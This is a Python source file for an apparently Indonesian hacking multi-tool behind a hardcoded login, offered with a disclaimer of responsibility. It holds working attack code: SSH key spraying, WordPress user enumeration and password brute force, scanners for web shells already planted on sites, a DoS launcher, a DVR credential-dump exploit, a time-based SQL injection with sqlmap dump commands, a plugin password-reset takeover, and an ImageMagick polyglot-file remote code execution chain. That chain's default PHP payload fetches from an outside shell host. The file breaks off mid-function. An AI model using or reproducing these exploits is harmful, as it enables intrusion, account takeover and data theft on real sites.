from lib import *
from colorama import Fore, Style, init

session = requests.Session()
requests.packages.urllib3.disable_warnings()
# Inisialisasi colorama
init(autoreset=True)
def warna(teks, kode_warna):
    return f"{kode_warna}{teks}{Fore.LIGHTGREEN_EX}{Style.RESET_ALL}"

space = "       "


# LOGIN
login_banner = f"""
{space}{space}{space}{Fore.RED}╔╗ ┬  ┌─┐┌─┐┬┌─  ╦  ┌─┐┌─┐┬┌┐┌
{space}{space}{space}{Fore.RED}╠╩╗│  ├─┤│  ├┴┐  ║  │ ││ ┬││││
{space}{space}{space}{Fore.RED}╚═╝┴─┘┴ ┴└─┘┴ ┴  ╩═╝└─┘└─┘┴┘└┘\n
{space}{Fore.CYAN}╔═══════════════════════════════════════════════════════════╗
{space}{Fore.CYAN}║ # TOOLS BY INDONESIAN BLACK SPACE                         ║
{space}{Fore.CYAN}╠═══════════════════════════════════════════════════════════╣
{space}{Fore.CYAN}║ # Developer Tidak Bertanggung jawab atas kegiatan anda!!  ║
{space}{Fore.CYAN}║ # Recode? Izin dulu ya baby                               ║
{space}{Fore.CYAN}╚═══════════════════════════════════════════════════════════╝\n"""

username = 'SeoBlack'
password = 'Indonesian'  # Ganti dengan password teks biasa Anda
max_failed_attempts = 3  # Maksimal upaya login gagal sebelum akun terkunci
lockout_duration = 24 * 60 * 60  # Durasi penguncian akun dalam detik (24 jam)

def is_account_locked(username, lockout_time):
    current_time = int(time.time())
    return lockout_time > current_time

def login():
    failed_attempts = 0
    lockout_time = 0

    while failed_attempts < max_failed_attempts:
        if is_account_locked(username, lockout_time):
            print("Dih Ngapain Lu?")
            exit()  # Keluar dari program jika akun terkunci
            return

        print(login_banner)
        entered_username = input(warna("┌──(BLACK@LOGIN)-[USERNAME]\n└─# ", Fore.LIGHTGREEN_EX))

        if entered_username == username:
            entered_password = getpass.getpass(warna("┌──(BLACK@LOGIN)-[PASSWORD]\n└─# ", Fore.LIGHTGREEN_EX))

            if entered_password == password:
                print("Wellcome Master")
                return
            else:
                failed_attempts += 1
                print("Login gagal. Silakan coba lagi.")
        else:
            print("Minta Dulu Ke Ownernya")
    
    # Jika pengguna mencoba login lebih dari 3 kali, kunci akun selama 24 jam.
    lockout_time = int(time.time()) + lockout_duration
    print("Mo Ngapaain sih Ngab?")
    exit()  # Keluar dari program setelah mengunci akun

# engine
def clear_text():
    if platform.system().upper() == "WINDOWS":
        os.system('cls')
    else:
        os.system('clear')

# Vmware
def vmware():
    def warna(teks, kode_warna):
        return f"{kode_warna}{teks}{Style.RESET_ALL}"
    target = input(warna("(VMware@CrackSSH)-[TARGET] => ", Fore.LIGHTGREEN_EX))
    port = input(warna("(VMware@CrackSSH)-[PORT] => ", Fore.LIGHTGREEN_EX))
    if not port:
        port = "22"
    for root, dirs, files in os.walk("keys"):
        for file in files:
            key = str(os.path.join(root, file))
            out = f"{Fore.LIGHTGREEN_EX}[+] Traying Keys: {key}\n"
            print (out)
            ssh = [
                "ssh", "-i", key, f"support@{target}", "-p", port, '-o', 'StrictHostKeyChecking=no', '-o', 'UserKnownHostsFile=/dev/null', '-o', 'BatchMode=yes'
            ]
            try:
                ssh = ' '.join(ssh)
                coutput = os.system(ssh)
            except Exception as e:
                log = warna(f"{Fore.RED}[-] Failed connecting to {target}:{port} with key {key}!")
                continue
########################################################################################################################
# WpBf
def wpbf():
    def read_passwords_from_file(file_name):
        try:
            with open(file_name, "r") as file:
                passwords = file.read().splitlines()
            return passwords
        except Exception as e:
            print(warna(f"Gagal membaca file {file_name}: {str(e)}", Fore.LIGHTRED_EX))
            return []

    def try_login_with_passwords(url, username, passwords):
        try:
            for password in passwords:
                # URL login
                login_url = url + "/wp-login.php"

                # Data yang akan dikirim dalam permintaan POST
                data = {
                    "log": username,
                    "pwd": password,
                    "wp-submit": "Log In",
                    "redirect_to": url,
                    "testcookie": "1"
                }

                # Melakukan permintaan POST untuk login
                response = requests.post(login_url, data=data)

                # Memeriksa apakah berhasil login dengan memeriksa URL setelah login
                if "/wp-admin/" in response.url:
                    print(warna(f"[+] Login berhasil! Username: {username}, Password: {password}", Fore.LIGHTGREEN_EX))
                    return True
                else:
                    print(warna(f"[-] Login gagal. Username: {username}, Password: {password}", Fore.LIGHTRED_EX))

            return False
        except Exception as e:
            print(Fore.RED + str(e) + Style.RESET_ALL)
            return False

    def get_usernames_from_api(url):
        try:
            api_url = url.rstrip("/") + "/wp-json/wp/v2/users"
            response = requests.get(api_url)

            if response.status_code == 200:
                users = response.json()
                usernames = [user['slug'] for user in users]
                return usernames

            print(warna(f"Gagal mendapatkan daftar pengguna dari API: {api_url}", Fore.LIGHTRED_EX))
            return []
        except Exception as e:
            print(Fore.RED + str(e) + Style.RESET_ALL)
            return []

    def detect(url):
        try:
            response = requests.get(url)
            headers = response.headers
            soup = BeautifulSoup(response.text, "html.parser")
            is_wordpress = False

            if "X-Powered-By" in headers and "WordPress" in headers["X-Powered-By"]:
                is_wordpress = True
            elif "X-Generator" in headers and "WordPress" in headers["X-Generator"]:
                is_wordpress = True
            elif "wp-content" in response.text:
                is_wordpress = True

            if is_wordpress:
                print(warna("CMS yang digunakan: WordPress", Fore.LIGHTGREEN_EX))

                usernames = get_usernames_from_api(url)
                if not usernames:
                    print(warna("Tidak dapat mendapatkan daftar pengguna dari API.", Fore.LIGHTRED_EX))
                    return

                print(warna("Daftar Pengguna di Situs WordPress:", Fore.LIGHTGREEN_EX))
                for username in usernames:
                    print(username)

                password_file = input(warna("┌──(Wordlist -> Target)-[#]\n└─# ", Fore.LIGHTGREEN_EX))
                passwords = read_passwords_from_file(password_file)

                for username in usernames:
                    login_result = try_login_with_passwords(url, username, passwords)
                    if login_result:
                        print(warna(f"Login Success for Username: {username}", Fore.LIGHTGREEN_EX))
                    else:
                        print(warna(f"Gagal Login for Username: {username}", Fore.LIGHTRED_EX))
            else:
                print(warna("Tidak ditemukan CMS WordPress.", Fore.LIGHTRED_EX))
        except Exception as e:
            print(Fore.RED + str(e) + Style.RESET_ALL)

    url = input(warna("┌──(Target@Localhost)-[#]\n└─# ", Fore.LIGHTGREEN_EX))
    detect(url)
########################################################################################################################
# Shell Scanner

def shell():
    def scan_directory(url, directory_file):
        try:
            with open(directory_file, 'r') as file:
                directories = file.read().splitlines()

            if not url.endswith('/'):
                url += '/'

            found_directories = []

            # Melakukan pemindaian direktori
            for directory in directories:
                directory_url = url + directory
                response = requests.get(directory_url)

                if response.status_code == 200:
                    print(warna(f"[+] Directory : {directory_url} => Found", Fore.LIGHTGREEN_EX))
                    found_directories.append(directory_url)
                elif response.status_code == 403:  # Ganti pesan 403 Forbidden menjadi "Found"
                    print(warna(f"[+] Directory : {directory_url} => Found", Fore.LIGHTGREEN_EX))
                    found_directories.append(directory_url)
                elif response.status_code == 404:
                    print(warna(f"[-] Directory : {directory_url} => Not Found", Fore.RED))
                else:
                    print(warna(f"[?] Error accessing {directory_url}: {response.status_code}", Fore.RED))

            return found_directories

        except Exception as e:
            print(warna(f"Error: {str(e)}", Fore.RED))
            return []

    def scan_files(directories, file_file):
        try:
            with open(file_file, 'r') as file:
                files = file.read().splitlines()

            found_files = []

            # Melakukan pemindaian file dalam setiap direktori
            for directory_url in directories:
                for file_name in files:
                    file_url = directory_url + "/" + file_name
                    response = requests.get(file_url)

                    if response.status_code == 200:
                        print(warna(f"[+] File : {file_url} => Found", Fore.LIGHTGREEN_EX))
                        found_files.append(file_url)
                    elif response.status_code == 404:
                        print(warna(f"[-] File : {file_url} => Not Found", Fore.RED))
                    else:
                        print(warna(f"[?] Error accessing {file_url}: {response.status_code}", Fore.RED))

            return found_files

        except Exception as e:
            print(warna(f"Error: {str(e)}", Fore.RED))
            return []
    def download_file(file_url):
        try:
            response = requests.get(file_url)

            if response.status_code == 200:
                # Ekstrak nama file dari URL
                file_name = file_url.split("/")[-1]
                download_dir = "found_shells"
                if not os.path.exists(download_dir):
                    os.makedirs(download_dir)

                file_path = os.path.join(download_dir, "found.txt")

                with open(file_path, 'a') as info_file:
                    info_file.write(f"File URL: {file_url}\n")
                
                print(warna(f"Downloaded file info: {file_url}", Fore.LIGHTGREEN_EX))
            else:
                print(warna(f"Failed to download file info: {file_url} (Status Code: {response.status_code})", Fore.RED))

        except Exception as e:
            print(warna(f"Error during download: {str(e)}", Fore.RED))

    website_url = input(warna("Enter the website URL: ", Fore.LIGHTGREEN_EX))
    
    with open(website_url, 'r') as url_file:
        websites = url_file.read().splitlines()

    # Memindai setiap situs web dalam daftar
    for website_url in websites:
        directory_file = "files/path.txt"
        found_directories = scan_directory(website_url, directory_file)

        if found_directories:
            scan_file_option = input(warna("Do you want to scan files in the found directories? (Y/n): ", Fore.LIGHTGREEN_EX))
            if scan_file_option.lower() == "Y" or scan_file_option.lower() == "y":
                file_file = "files/filepath.txt"
                found_files = scan_files(found_directories, file_file)

                if found_files:
                    download_option = input(warna("Do you want to download the found files? (Y/n): ", Fore.LIGHTGREEN_EX))
                    if download_option.lower() == "Y" or download_file.lower() == "y":
                        # Download hasil pemindaian
                        for found_file in found_files:
                            download_file(found_file)
                    else:
                        print(warna("File results not downloaded.", Fore.YELLOW))
                else:
                    print(warna("No files found to scan.", Fore.YELLOW))
            else:
                print(warna("Files not scanned.", Fore.YELLOW))
        else:
            print(warna("No directories found to scan files.", Fore.YELLOW))
########################################################################################################################
def dos():
    clear_text()
    os.system("python dos.py")
#########################################################################################################
def shell2():
    def scan(url, directory_file):
        try:
            with open(directory_file, 'r') as file:
                directories = file.read().splitlines()

            if not url.endswith('/'):
                url += '/'

            found_shells = []

            # Melakukan pemindaian direktori
            for directory in directories:
                directory_url = url + directory
                response = requests.get(directory_url)

                if response.status_code == 200:
                    print(warna(f"[+] Shell : {directory_url} => Found", Fore.LIGHTGREEN_EX))
                    found_shells.append(directory_url)
                elif response.status_code == 404:
                    print(warna(f"[-] Shell : {directory_url} => Not Found", Fore.RED))
                else:
                    print(warna(f"[?] Error accessing {directory_url}: {response.status_code}", Fore.RED))

            return found_shells

        except Exception as e:
            print(warna(f"Error: {str(e)}", Fore.RED))
            return []

    def warna(text, color):
        return f"{color}{text}"

    website_url = input(warna("Enter the website URL: ", Fore.LIGHTGREEN_EX))
    
    with open(website_url, 'r') as url_file:
        websites = url_file.read().splitlines()

    # Memindai setiap situs web dalam daftar
    for website_url in websites:
        directory_file = "files/lib.txt"
        found_shells = scan(website_url, directory_file)

        if found_shells:
            download_option = input(warna("Do you want to download the found shells? (yes/no): ", Fore.LIGHTGREEN_EX))
            if download_option.lower() == "yes":
                # Download hasil pemindaian
                download_results(found_shells)
            else:
                print(warna("Results not downloaded.", Fore.YELLOW))
def download_results(found_shells):
    try:
        download_dir = "Found"
        if not os.path.exists(download_dir):
            os.makedirs(download_dir)

        download_log_path = os.path.join(download_dir, "found_shell.txt")

        with open(download_log_path, 'w') as download_log:
            for shell_url in found_shells:
                response = requests.get(shell_url)
                if response.status_code == 200:
                    # Ekstrak nama file dari URL
                    file_name = shell_url.split("/")[-1]
                    file_path = os.path.join(download_dir, file_name)

                    with open(file_path, 'wb') as file:
                        file.write(response.content)
                    download_log.write(f"Found Shell: {shell_url} => {file_name}\n")
                else:
                    download_log.write(f"Failed to download: {shell_url} (Status Code: {response.status_code})\n")

        print(f"Download log saved to: {download_log_path}")

    except Exception as e:
        print(f"Error during download: {str(e)}")

def cve9995():
    HST = input(warna('Host Target :', Fore.LIGHTMAGENTA_EX))
    port = input(warna('Portnya baby :', Fore.LIGHTMAGENTA_EX))
    headers = {}

    fullHost_1  =   "http://"+HST+":"+str(port)+"/device.rsp?opt=user&cmd=list"
    host        =   "http://"+HST+":"+str(port)+"/"
    def makeReqHeaders(xCookie):
        headers["Host"]             =  host
        headers["User-Agent"]       = "Morzilla/7.0 (911; Pinux x86_128; rv:9743.0)"
        headers["Accept"]           = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" 
        headers["Accept-Languag"]   = "es-AR,en-US;q=0.7,en;q=0.3"
        headers["Connection"]       = "close"
        headers["Content-Type"]     = "text/html"
        headers["Cookie"]           = "uid="+xCookie
        
        return headers
    try:
        rX = requests.get(fullHost_1,headers=makeReqHeaders(xCookie="admin"),timeout=10.000)
    except Exception as e:
        #print(e)
        print(warna("[-] Timed Out", Fore.RED))
        exit()

    badJson = rX.text
    try:
        dataJson = json.loads(badJson)
        totUsr = len(dataJson["list"])
    except Exception as e:
        print(warna(" [+] Error: "+str(e), Fore.RED))
        print(warna(" [>] json: "+str(rX), Fore.LIGHTMAGENTA_EX))
        exit()
    print(warna("\n [+] DVR (url):\t\t"+str(host), Fore.LIGHTGREEN_EX))
    print(warna(" [+] Port: \t\t"+str(port), Fore.LIGHTGREEN_EX))

    print(warna("\n [+] Users List:\t"+str(totUsr), Fore.LIGHTGREEN_EX))
    print(" ")

    final_data = []
    try:
        for obj in range(0,totUsr):

            temp = []

            _usuario    = dataJson["list"][obj]["uid"]
            _password   = dataJson["list"][obj]["pwd"]
            _role       = dataJson["list"][obj]["role"]

            temp.append(_usuario) 
            temp.append(_password)
            temp.append(_role)

            final_data.append(temp)

            hdUsr  = warna("Username", Fore.LIGHTGREEN_EX) 
            hdPass = warna("Password", Fore.LIGHTGREEN_EX) 
            hdRole = warna("Role ID", Fore.LIGHTGREEN_EX) 

            cabeceras = [hdUsr, hdPass, hdRole] 

        tp.table(final_data, cabeceras, width=20)

    except Exception as e:
        print(" [!]: "+str(e))
        print(" [+] "+ str(dataJson))

    print(" ")
#######################################################################################################################
def exploit1():
    def get_request(target_url, delay="1"):
        payload = "a' OR (SELECT 1 FROM (SELECT(SLEEP(" + delay + ")))a)-- -"
        data = {'rest_route': '/pmpro/v1/order',
                'code': payload}
        return requests.get(target_url, params=data).elapsed.total_seconds()
    target_url = input(warna("┌──(Exploit1@USIWP)-[#]\n└─# ", Fore.LIGHTGREEN_EX))
    try:
        print(warna('[-] Testing if the target is vulnerable...', Fore.LIGHTCYAN_EX))
        req = requests.get(target_url, timeout=15)
    except:
        print(warna('[!] ERROR: Target is unreachable', Fore.RED))
        sys.exit(2)
    if get_request(target_url, "1") >= get_request(target_url, "2"):
        print(warna('[!] The target does not seem vulnerable',Fore.RED))
        sys.exit(3)
    print(warna('\n[*] The target is vulnerable', Fore.LIGHTGREEN_EX))
    print(warna('\n[+] You can dump the whole WordPress database with:', Fore.LIGHTGREEN_EX))
    print(warna('sqlmap -u "/?rest_route=/pmpro/v1/order&code=a" -p code --skip-heuristics --technique=T --dbms=mysql --batch --dump',Fore.LIGHTGREEN_EX .format(target_url)))
    print(warna('\n[+] To dump data from specific tables:', Fore.LIGHTGREEN_EX))
    print(warna('sqlmap -u "/?rest_route=/pmpro/v1/order&code=a" -p code --skip-heuristics --technique=T --dbms=mysql --batch --dump -T wp_users',Fore.LIGHTGREEN_EX .format(target_url)))
    print(warna('\n[+] To dump only WordPress usernames and passwords columns (you should check if users table have the default name):', Fore.LIGHTGREEN_EX))
    print(warna('sqlmap -u "/?rest_route=/pmpro/v1/order&code=a" -p code --skip-heuristics --technique=T --dbms=mysql --batch --dump -T wp_users -C user_login,user_pass',Fore.LIGHTGREEN_EX .format(target_url)))
    sys.exit(0)
#######################################################################################################################
def exploit2():
    def check_version(target):
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299'
        }
        response = session.get(target, headers=headers, verify=False)
        if "/front-end/css/view/general.min.css" in response.text:
            try:
                version_match = re.search(r"front-end/css/view/general\.min\.css\?ver=(\d+\.\d+\.\d+)", response.text)
                if version_match:
                    version = version_match.group(1)
                    if "5.4.0" <= version <= "5.7.1":
                        print(warna("[+] Found Vulnerable Version:",Fore.LIGHTGREEN_EX ,version))
                        return True
                    else:
                        print(warna("[-] Found version: ", Fore.LIGHTGREEN_EX +version+" sadly not vulnerable.", Fore.RED))
                        exit()
            except Exception as e:
                print(warna("[?] Error occurred while extracting version:",Fore.RED, str(e)))
        else:
            url = f"{target}/wp-content/plugins/essential-addons-for-elementor-lite/readme.txt"
            response = session.get(url, headers=headers, verify=False)
            if "Essential Addons for Elementor" not in response.text:
                print(warna("[-] Unable to find essential-addons-for-elementor-lite plugin readme.txt.", Fore.RED))
                exit()
            for line in response.text:
                if line.startswith("Stable tag:"):
                    stable_tag = line.split(":")[1].strip()  # Extract the value of the stable tag
                    print(stable_tag)
                    if "5.4.0" <= stable_tag <= "5.7.1":
                        print(warna("[+] Found Vulnerable Version:",Fore.LIGHTGREEN_EX, stable_tag))
                        return True
                    else:
                        print(warna("[-] Found version: ",Fore.LIGHTGREEN_EX+stable_tag+" sadly not vulnerable.",Fore.RED))
                        exit()
    def extract_usernames(taregt):
        try:
            rss_usernames = extract_usernames_rss(taregt)
            rest_api_usernames = get_usernames_rest_api(taregt)
            sitemap_usernames = get_usernames_sitemap(taregt)
            rest_api2_usernames = scrape_users_via_rest_api(taregt)
            all_usernames = list(set(rss_usernames) | set(rest_api_usernames) | set(sitemap_usernames) | set(rest_api2_usernames))
            return all_usernames
        except Exception as e:
            print(warna("[?] Error occurred while extracting usernames:",Fore.RED, str(e)))
    # Method 1: Using WordPress RSS feed
    def extract_usernames_rss(target):
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299'
        }
        response = session.get(f"{target}/feed/", headers=headers, verify=False)
        if response.status_code == 200:
            soup = BeautifulSoup(response.text, "xml")
            try:
                all_usernames = []
                for item in soup.find_all("item"):
                    creator = item.find("dc:creator")
                    if creator and creator.text:
                        all_usernames.append(creator.text)
                return all_usernames
            except Exception as e:
                print(warna(f"[-] Failed to fetch usernames using RSS Feed. Error: {e} ", Fore.RED))
                return []
        else:
            print(warna(f"[-] Failed to fetch usernames using RSS Feed. Error: {response.text}", Fore.RED))
            return []
    def get_usernames_rest_api(target):
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299'
        }
        api_url = target + '/wp-json/wp/v2/users'
        response = session.get(api_url, headers=headers, verify=False)
        if response.status_code == 200:
            users = response.json()
            usernames = [user['slug'] for user in users]
            return usernames
        else:
            print(warna(f"[-] Failed to fetch usernames using REST API. Error: {response.text}", Fore.RED))
            return []
    def get_usernames_sitemap(target):
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299'
        }
        response = session.get(f"{target}/author-sitemap.xml", headers=headers, verify=False)
        if response.status_code == 200:
            soup = BeautifulSoup(response.text, "xml")
            usernames = set()
            for loc in soup.find_all("loc"):
                match = re.search(r"/author/([^/]+)/?$", loc.text.strip())
                if match:
                    usernames.add(match.group(1))
            return usernames
        else:
            print(warna(f"[-] Failed to fetch usernames using author-sitemap.xml. Error http status code " + str(response.status_code) + "", Fore.RED))
            return []
    def scrape_users_via_rest_api(target):
        try:
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299'
            }
            api_url = f"{target}/?rest_route=/wp/v2/users"
            response = requests.get(api_url, headers=headers, verify=False)
            if response.status_code == 200:
                users = response.json()
                usernames = [user['slug'] for user in users]
                return usernames
            else:
                print(warna(f"[-] Failed to fetch usernames using REST Route API. Error: {response.text}", Fore.RED))
                return []
        except Exception as e:
            print(warna("[-] Error occurred while scraping users:",Fore.RED, str(e)))
            return []
    def select_username(usernames):
        if not usernames:
            print(warna("[-] Sorry, unable to help. No usernames found.",Fore.RED))
            exit()

        print(warna("[=] Please select a username:", Fore.LIGHTGREEN_EX))
        for i, username in enumerate(usernames):
            print(f"{i + 1}. {username}")
        index = int(input("> ")) - 1
        return list(usernames)[index]
    def extract_nonce(target):
        try:
            url = f"{target}/"
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299'
            }
            response = session.get(url, headers=headers, verify=False)
            soup = BeautifulSoup(response.text, "lxml")
            script_tag = soup.find("script", string=lambda t: "var localize" in str(t))
            script_text = script_tag.text.strip() if script_tag else ""
            nonce_start_index = script_text.find('"nonce":"') + 9
            nonce_end_index = script_text.find('"', nonce_start_index)
            return script_text[nonce_start_index:nonce_end_index]
        except Exception as e:
            print(warna("[-] Sorry, not able to help.",Fore.RED))
            exit()
    def send_request(target, nonce, user, password):
        url = f"{target}/wp-admin/admin-ajax.php"
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299",
            "Content-Type": "application/x-www-form-urlencoded",
        }

        payload = {
            "action": "login_or_register_user",
            "eael-resetpassword-submit": "true",
            "page_id": "124",
            "widget_id": "224",
            "eael-resetpassword-nonce": nonce,
            "eael-pass1": password,
            "eael-pass2": password,
            "rp_login": user
        }

        response = session.post(url, headers=headers, data=payload, verify=False)

        if 'success":true' in response.text:
            print(warna("[+] All Set! You can now login using the following credentials:", Fore.LIGHTGREEN_EX))
            print("Username: ", user)
            print("Password: ", password)
            print("Admin Url: " + target + "/wp-admin/")
        else:
            print(warna("[-] Error, see html response below to debug", Fore.RED))
            print(response.text)
    def read_passwords_from_file(file_name):
            try:
                with open(file_name, "r") as file:
                    passwords = file.read().splitlines()
                return passwords
            except Exception as e:
                print(warna(f"[-] Gagal membaca file {file_name}: {str(e)}", Fore.RED))
                return []
    target = input("URL # ")
    password = input("PASSWORD # ")
    username = input("UERNAME (OPTIONAL) # ")
    passwords = read_passwords_from_file(password)
    check_version(target)
    if not username:
        try:
            all_usernames = extract_usernames(target)
        except Exception as e:
            print(warna(f"[-] Error extracting usernames: {e}", Fore.RED))
            exit()

        selected_username = select_username(all_usernames)
    else:
        selected_username = username

    nonce = extract_nonce(target)
    if not nonce:
        print(warna("[-] Sorry, not able to extract the nonce", Fore.RED))
        exit()
    print(warna(f"Nonce value: {nonce}", Fore.LIGHTGREEN_EX))
    print(warna(f"Username value: {selected_username}",Fore.LIGHTGREEN_EX))

    send_request(target, nonce, selected_username, password)
#######################################################################################################################
def exploit3():
    target = input("Enter the target URL (ex: http://victimwordpress.org): ")
    remoteftp = input("Enter the remote FTP URL (ex: ftp://X.X.X.X:PORT): ")
    remotehttp = input("Enter the remote HTTP URL (ex: http://X.X.X.X:PORT): ")
    svg_polyglot_name = input("Enter the name of the polyglot SVG/MSL file: ")
    svg_exploiter_names = input("Enter the name of the external VID bruteforcers file: ")
    png_polyglot_name = input("Enter the name of the polyglot PNG/PHP file: ")
    concurrency = int(input("Enter the concurrency value (default 100): "))
    generatesvg = input("Generate both polyglot SVG/MSL file and VID bruteforcer? (True/False): ").lower() == 'true'
    webserverpath = input("Enter the web server path on the victim server (ex: /var/www/html): ")
    exploitname = input("Enter the name of the dropped exploit (ex: pwned.php): ")
    generatepng = input("Generate polyglot PNG/PHP file? (True/False): ").lower() == 'true'
    MAX_CONCURRENT_THREADS = 10
    bruteforce_list = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_-"  
    if generatepng:
        payload = input("Enter the PHP Payload to integrate in the PNG file: ")
    else:
        payload = "<?php file_get_contents('https://shell.prinsh.com/Nathan/gelay.txt')?>"
    if generatepng:
        print(warna("\t[-] Option to generate polyglot PNG/PHP selected", Fore.LIGHTCYAN_EX))           
        if not payload or not png_polyglot_name:
            print(warna("\t[x] The payload and png_polyglot_name options are needed to be set to create the PNG file", Fore.RED))    
            exit()
        if not os.path.exists("./files"):
            os.mkdir("./files")
        try:
            targetImage = Image.open("files/tikus.png")
            metadata = PngInfo()
            metadata.add_text("Comment", payload)
            targetImage.save("files/"+png_polyglot_name, pnginfo=metadata)      
            print(warna("\t\t[-] "+png_polyglot_name+" polyglot PNG/PHP file generated", Fore.LIGHTGREEN_EX)) 
            exit()
        except Exception as e:
            print(warna("\t[x] No PNG file found in the folder files, add a standard PNG sample.png in it", Fore.RED))    
            exit()
    elif generatesvg:
        print(warna("\t[-] Option to generate SVG selected", Fore.LIGHTCYAN_EX))
        if not svg_polyglot_name or not svg_exploiter_names or not remotehttp or not png_polyglot_name or not webserverpath or not exploitname:
            print(warna("\t\t[x] The --svg_polyglot_name, --svg_exploiter_names, --remotehttp, --png_polyglot_name, --webserverpath and --exploitname options are needed to create the SVG/MSL Polyglot file", Fore.RED))    
            exit()
        elif "FUZZ" not in svg_exploiter_names:
            print(warna("\t\t[x] The --svg_exploiter_names needs to include a FUZZ part to create the files", Fore.RED))    
            exit()            
        else:
            print(warna("\t[-] Generating polyglot SVG/MSL file using user inputs", Fore.LIGHTCYAN_EX))  
            poly_svg = """<?xml version=\"1.0\" encoding=\"UTF-8\"?>
    <image>
    <read filename=\"%(remotehttp)s\" />
    <resize geometry=\"400x400\" />
    <write filename=\"%(webserverpath)s\" />
    <get width=\"base-width\" height=\"base-height\" />
    <svg width=\"700\" height=\"700\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\">
    <image xlink:href=\"http://192.192.192.23:1664/neverExist.svg\" height="100" width="100"/>
    </svg>
    </image>""" % { "remotehttp": remotehttp +"/"+png_polyglot_name , "webserverpath" : webserverpath+"/"+exploitname }


            if not os.path.exists("./remote_ftp"):
                os.mkdir("./remote_ftp")

            f = open("./remote_ftp/"+svg_polyglot_name,"w")
            f.write(poly_svg)
            f.close()
            f = open("./remote_ftp/"+svg_polyglot_name+"[0]", "w")
            f.write(poly_svg)
            f.close()
            print(warna("\t\t[-] "+svg_polyglot_name+" generated", Fore.LIGHTGREEN_EX)) 


            #Generating msl:vid bruteforcers
            print(warna("\t[-] Generating bruteforce file using text:vid:msl formatter", Fore.LIGHTCYAN_EX))
            for i in bruteforce_list:
                filename = svg_exploiter_names.replace("FUZZ",i)
                exploiter_content = """<svg width=\"500\" height=\"500\"
xmlns:xlink=\"http://www.w3.org/1999/xlink\">
xmlns=\"http://www.w3.org/2000/svg\">
<image xlink:href=\"text:vid:msl:/tmp/magick-%(letter)s*\"  width=\"500\" height=\"500\" />
</svg>""" % { "letter" : i }
                f = open("./remote_ftp/"+filename, "w")
                f.write(exploiter_content)
                f.close

                f = open("./remote_ftp/"+filename+"[0]", "w")
                f.write(exploiter_content)
                f.close

                print(warna("\t\t[-] "+filename+" generated", Fore.LIGHTGREEN_EX)) 
            
            print(warna("\t[-] All files have been generated successfully", Fore.LIGHTGREEN_EX)) 
            exit()
    elif target and remoteftp and remotehttp and svg_polyglot_name and svg_exploiter_names and png_polyglot_name and exploitname:
        print(warna("\t[-] All arguments for exploiting target are set, beginning the first checks", Fore.LIGHTGREEN_EX))        

        if "FUZZ" not in svg_exploiter_names:
            print(warna("\t\t[x] The --svg_exploiter_names needs to include a FUZZ part to be used in exploitation", Fore.RED))    
            exit()  

        target_mla = target+"/wp-content/plugins/media-library-assistant/includes/mla-stream-image.php"
        target_mla_readme = target+"/wp-content/plugins/media-library-assistant/readme.txt"
        try:
            r = requests.get(target_mla_readme)
        except Exception as e:
            print(warna("\t[x] The target seems to be down, error:" +str(e), Fore.RED))
        
        if r.status_code == 404:
            print(warna("\t[x] The target seems not be running the plugin", Fore.RED))
            exit()
        else:
            if re.findall('(?mi)Stable tag: ([0-9.]+)', r.text):
                if float(re.findall('(?mi)Stable tag: ([0-9.]+)', r.text)[0]) < 3.10:
                    print(warna("\t[-] The target seems to be running the plugin in vulnerable version (<3.10)", Fore.LIGHTGREEN_EX))
                else: 
                    print(warna("\t[x] The Plugin version seems to be installed but not in a vulnerable version", Fore.RED))

        #Checking FTP files
        ftp_target = remoteftp + "/" +svg_polyglot_name
        ftp_taget_frame = ftp_target+"[0]"
        requests_ftp.monkeypatch_session()

        s = requests.Session()
        try:
            resp = s.get(ftp_target)
        except:
            print(warna("\t[x] Error while getting the remote FTP polyglot SVG/MSL file "+ftp_target, Fore.RED))
            exit()
        if (resp.status_code == 200):
            print(warna("\t[-] The remote FTP polyglot SVG/MSL file is reachable", Fore.LIGHTGREEN_EX))
        
        try:
            resp = s.get(ftp_taget_frame)
        except:
            print(warna("\t[x] Error while getting the remote FTP polyglot SVG/MSL file ending with [0] "+ftp_target, Fore.RED))
            exit()
        if (resp.status_code == 200):
            print(warna("\t[-] The remote FTP polyglot SVG/MSL file ending with [0] is reachable", Fore.LIGHTGREEN_EX))


        ftp_target_exploiter = remoteftp + "/"+svg_exploiter_names.replace("FUZZ", random.choice(bruteforce_list))
        ftp_taget_exploiter_frame = ftp_target_exploiter+"[0]"
        requests_ftp.monkeypatch_session()
        s = requests.Session()
        try:
            resp = s.get(ftp_target_exploiter)
        except:
            print(warna("\t[x] Error while getting a sample remote FTP exploiter VID test file "+ftp_target, Fore.RED))
            exit()
        if (resp.status_code == 200):
            print(warna("\t[-] A sample remote FTP exploiter VID test file is reachable", Fore.LIGHTGREEN_EX))
        
        try:
            resp = s.get(ftp_taget_exploiter_frame)
        except:
            print(warna("\t[x] Error while getting a sample remote FTP exploiter VID test file ending with [0] "+ftp_target, Fore.RED))
            exit()
        if (resp.status_code == 200):
            print(warna("\t[-] A sample Remote FTP exploiter VID test file ending with [0] is reachable", Fore.LIGHTGREEN_EX))


        #Checking final PNG/PHP polyglot file
